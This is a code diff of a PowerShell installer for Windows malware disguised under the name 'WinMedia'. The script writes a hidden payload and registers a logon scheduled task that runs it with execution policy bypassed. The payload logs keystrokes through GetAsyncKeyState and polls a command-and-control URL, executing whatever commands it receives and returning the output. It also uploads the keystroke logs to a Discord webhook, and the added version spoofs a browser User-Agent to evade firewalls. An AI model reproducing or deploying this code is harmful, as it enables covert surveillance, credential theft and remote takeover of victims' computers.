@@ -1,86 +1,102 @@
 param([string]$PCName, [string]$WebhookUrl, [string]$C2Url)
 
-$d = "$env:LOCALAPPDATA\WinMedia"
-if(!(Test-Path $d)){New-Item $d -Type Directory | Out-Null}
+# 1. Establish secure, dedicated working directory
+$dir = "$env:LOCALAPPDATA\WinMedia"
+if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
 
-$l = "$d\data.txt"
-$p = "$d\winlog.ps1"
-$c = "$d\config.json"
+$logFile = "$dir\data.txt"
+$scriptPath = "$dir\winlog.ps1"
 
-# Save execution parameters cleanly to a local configuration JSON file
-$config = @{
-    PCName     = $PCName
-    WebhookUrl = $WebhookUrl
-    C2Url      = $C2Url
-    LogFile    = $l
-}
-$config | ConvertTo-Json | Set-Content -Path $c -Force
+# 2. Build the operational loop script block verbatim
+$payloadContent = @"
+# Global session variables passed from compiler layer
+$`PCName     = '$PCName'
+$`WebhookUrl = '$WebhookUrl'
+$`C2Url      = '$C2Url'
+$`logFile    = '$logFile'
 
-# The internal operational loop script reads the config file locally on startup
-$scriptContent = @'
-$d = "$env:LOCALAPPDATA\WinMedia"
-$c = "$d\config.json"
+# Ensure the log file exists immediately to prevent pointer errors
+if (!(Test-Path $`logFile)) { New-Item $`logFile -Type File | Out-Null }
 
-if (Test-Path $c) {
-    $config = Get-Content -Path $c | ConvertFrom-Json
-    $PCName     = $config.PCName
-    $WebhookUrl = $config.WebhookUrl
-    $C2Url      = $config.C2Url
-    $l          = $config.LogFile
-} else {
-    exit
-}
+# Re-verify user32.dll loading logic for non-interactive hidden desktop execution contexts
+try {
+    `$Signature = '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);'
+    Add-Type -TypeDefinition "using System.Runtime.InteropServices; public class KeyEngine { `$Signature }" -ErrorAction SilentlyContinue
+} catch {}
 
-# 1. Discord Exfiltration Loop
-Start-Job -ScriptBlock {
-    param($l, $WebhookUrl, $PCName)
-    while($true){
-        if(Test-Path $l){ 
-            if((Get-Item $l).Length -gt 0){
-                $fn = "${PCName}_" + (Get-Date -Format 'yyyy-MM-dd_HH-mm-ss') + '.txt'
-                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Form @{file=Get-Item $l; filename=$fn}
-                Clear-Content $l -ErrorAction SilentlyContinue
+# Thread-safe execution intervals tracking counters
+`$c2Interval      = 0
+`$discordInterval = 0
+
+# Set a standard User-Agent header to bypass basic web firewalls / cloud protection
+`$headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
+
+while (`$true) {
+    # ================= ENGINE A: NATIVE WIN32 KEYLOGGER =================
+    # Scan standard ASCII virtual key ranges safely
+    for (`$i = 8; `$i -le 190; `$i++) {
+        if ([KeyEngine]::GetAsyncKeyState(`$i) -eq -32767) {
+            `$char = [char]`$i
+            if (`$i -eq 13) { `$char = [char]10 } # Line break on Enter
+            if (`$i -eq 32) { `$char = " " }      # Spacebar stabilization
+            
+            # Keep logging functional regardless of file system locks
+            try {
+                "`$char" | Out-File `$logFile -Append -NoNewline -ErrorAction SilentlyContinue
+            } catch {}
+        }
+    }
+
+    # ================= ENGINE B: REMOTE COMMAND POLLING (Every 5 Seconds) =================
+    if (`$c2Interval -ge 500) {
+        try {
+            `$targetUrl = "`$(${C2Url})/get_cmd?id=`$(${PCName})"
+            `$cmdResponse = Invoke-RestMethod -Uri `$targetUrl -Method Get -Headers `$headers -TimeoutSec 5
+            
+            if (`$cmdResponse -and `$cmdResponse -ne 'wait') {
+                # Execute command natively and capture standard error channels 
+                `$output = (Invoke-Expression `$cmdResponse 2>&1 | Out-String)
+                if (!`$output) { `$output = 'Command executed with no return data.' }
+                
+                `$postUrl = "`$(${C2Url})/send_res?id=`$(${PCName})"
+                Invoke-RestMethod -Uri `$postUrl -Method Post -Body @{ output = `$output } -Headers `$headers -TimeoutSec 5 | Out-Null
+            }
+        } catch {}
+        `$c2Interval = 0
+    }
+
+    # ================= ENGINE C: DISCORD EXFILTRATION (Every 60 Seconds) =================
+    if (`$discordInterval -ge 6000) {
+        if (Test-Path `$logFile) {
+            if ((Get-Item `$logFile).Length -gt 0) {
+                try {
+                    `$timestamp = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'
+                    `$fileName = "`$(${PCName})_`$(${timestamp}).txt"
+                    
+                    # Package and transmit data safely
+                    Invoke-RestMethod -Uri `$WebhookUrl -Method Post -Form @{ file = Get-Item `$logFile; filename = `$fileName } -TimeoutSec 10 | Out-Null
+                    Clear-Content `$logFile -ErrorAction SilentlyContinue
+                } catch {}
             }
         }
-        Start-Sleep -s 30
+        `$discordInterval = 0
     }
-} -ArgumentList $l, $WebhookUrl, $PCName
 
-# 2. C2 Reverse Shell Worker Loop
-Start-Job -ScriptBlock {
-    param($C2Url, $PCName)
-    while($true){
-        try {
-            $cmd = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get
-            if($cmd -and $cmd -ne 'wait'){
-                $res = (Invoke-Expression $cmd 2>&1 | Out-String)
-                if(!$res){$res = 'Command executed with no output'}
-                Invoke-RestMethod -Uri "${C2Url}/send_res?id=${PCName}" -Method Post -Body @{output=$res}
-            }
-        } catch { Start-Sleep -s 15 }
-        Start-Sleep -s 5
-    }
-} -ArgumentList $C2Url, $PCName
-
-# 3. Native Win32 Keylogger Engine
-Add-Type -TypeDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);' -Name 'W' -Namespace 'U'
-while($true){ 
-    for($i=8; $i -le 190; $i++){ 
-        if([U.W]::GetAsyncKeyState($i) -eq -32767){ 
-            $k=[char]$i; if($i -eq 13){$k=[char]10} 
-            "$k" | Out-File $l -Append -NoNewline 
-        } 
-    } 
-    Start-Sleep -m 10 
+    # High-precision cycle step loops (10ms tick speed matches standard microcontrollers)
+    Start-Sleep -m 10
+    `$c2Interval += 10
+    `$discordInterval += 10
 }
-'@
+"@
 
-# Save persistent target script to folder
-Set-Content -Path $p -Value $scriptContent
-Set-ItemProperty -Path $p -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
-Set-ItemProperty -Path $c -Name Attributes -Value Hidden -ErrorAction SilentlyContinue
+# 3. Save payload cleanly to the local directory without dynamic array corruptions
+Set-Content -Path $scriptPath -Value $payloadContent -Force
 
-# Clear old instances, register clean task, and spin up
+# 4. Wipe out any older broken task profiles cleanly
 schtasks /delete /tn 'WinMediaLog' /f 2>&1 | Out-Null
-schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`"" /sc onlogon
+
+# 5. Register the new execution task using Bypass parameters natively matching Task Scheduler standards
+schtasks /create /f /tn 'WinMediaLog' /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" /sc onlogon
+
+# 6. Kickstart execution instantly for this active setup session
 schtasks /run /tn 'WinMediaLog'
